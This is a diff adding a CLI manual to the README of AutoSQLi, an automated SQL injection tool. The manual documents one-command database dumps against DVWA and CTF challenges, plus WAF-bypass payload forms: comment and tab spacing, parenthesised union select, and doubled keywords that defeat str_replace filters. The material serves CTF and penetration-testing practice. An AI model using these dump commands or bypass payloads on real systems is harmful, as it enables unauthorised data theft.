@@ -126,9 +126,65 @@ python -m autosqli.gui
 # 命令行（本地 DVWA 一键分析 + 全自动脱库）
 python -m autosqli.cli -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
     --dvwa admin:password --dump
-# 其他等级：--security medium（POST 数字型）/ --security high（自动配置两步提交）
-# 指定通道：--technique union|error|bool_blind|time_blind；跳过 WAF 扫描：--no-waf
 ```
+
+## CLI 使用手册（推荐）
+
+CLI 是 AutoSQLi 的一等使用方式：脚本化、可复制粘贴、输出可直接进报告。
+
+### 参数总表
+
+| 参数 | 说明 |
+| --- | --- |
+| `-u URL` | 目标 URL（必填）。查询串中的参数会被自动拆出 |
+| `-p, --param` | 被测参数名；留空自动选择第一个非常量参数 |
+| `--method GET\|POST` | 请求方式（配 `--data` 时自动 POST） |
+| `--data k=v [k=v ...]` | POST 表单字段 |
+| `--cookie k=v [k=v ...]` | 附加 Cookie |
+| `--dvwa USER:PASS` | DVWA 类靶场自动登录（解析 user_token） |
+| `--security low\|medium\|high` | DVWA 安全等级；high 自动配置两步提交（session-input） |
+| `--stage-url URL` | 两步提交入口（先写值再触发：二次注入类题型） |
+| `--base-value` | 被测参数基线值（默认 `1`） |
+| `--delay 秒` | 请求间隔（限速，防封） |
+| `--no-waf` | 跳过 WAF 字典扫描（快速模式；剥离型 WAF 下不建议） |
+| `--technique KEY` | 指定通道：`union` / `error` / `bool_blind` / `time_blind` / `stacked` / `auto` |
+| `--max-rows N` | 每表最大导出行数（默认 20） |
+| `--dump` | 分析后自动全自动脱库 |
+| `--report PATH` | 分析报告输出为 JSON |
+| `--quiet` | 不打印请求日志 |
+
+### 输出解读
+
+1. **注入点行**：闭合/注释/列数/回显位；
+2. **WAF 清单**：每项标注「可用 / 已过滤 / 未知」+ 判定依据 + 绕过建议；
+3. **指纹**：错误回显、联合回显、布尔/时间盲注、堆叠、宽字节、版本/库/用户；
+4. **方法清单**：★ 推荐（WAF 感知自动裁剪）→ 选择通道脱库；
+5. 任何响应中出现 flag 格式（`flag{}`/`ctfshow{}`/`CTF2{}` 等）会即时以 `[FLAG]` 报告。
+
+### 实战案例（全部为无人工干预的一次命令通关）
+
+| 靶题 | WAF 特征 | 命令 | 结果 |
+| --- | --- | --- | --- |
+| DVWA low | 无 | `cli -u ".../sqli/?id=1&Submit=Submit" --dvwa admin:password --dump` | 4 通道全开，users 表全量 |
+| DVWA medium | POST 数字型 | `cli -u ".../sqli/" --method POST --data id=1 Submit=Submit --dvwa admin:password --security medium --dump` | union 脱库 |
+| DVWA high | 两步提交+空报错页 | `cli -u ".../sqli/?id=1" --dvwa admin:password --security high --dump` | union 脱库 |
+| ctfshow web6 | 空格+`/**/`被滤、登录框吞错 | `cli -u ".../index.php" --method POST --data username=admin password=1 -p password --dump` | 括号法 union，flag 124 请求 |
+| ctfshow web7 | 空格/tab/引号全滤、数字型 | `cli -u ".../index.php" -p id --dump` | hex marker + inline 形态，flag 126 请求 |
+| 强网杯 随便注 | select 等七关键字+点号 | `cli -u ".../index.php?inject=1" --technique stacked --dump` | 堆叠 PREPARE+hex，flag 109 请求 |
+| 极客 LoveSQL | 无 | `cli -u ".../check.php?username=admin&password=admin" -p password --dump` | union，flag 133 请求 |
+| 极客 BabySQL | 关键字 str_replace 剥离 | 同上 | **or 双写自动还原**，跨库 `ctf.Flag` 拿 flag，144 请求 |
+
+### 形态自适应（WAF 感知核心）
+
+工具会实测命中一种 payload 形态（`injection.form`），此后所有构造自动套用：
+
+| form | 适用环境 | 样式 |
+| --- | --- | --- |
+| classic | 无过滤 | `1' union select ...` |
+| inline | 空格被滤、`/**/` 可用 | `1'/**/union/**/select/**/...` |
+| tab | 空格被滤、%09 可用 | `1'\tunion\tselect\t...` |
+| paren | 空格与 `/**/` 均被滤 | `1'union(select(a),(b))from(t)` |
+| orinject | 关键字被 str_replace 剥离 | `1'unorion selorect ...`（剥离后还原 union select） |
 
 ## 测试环境
 
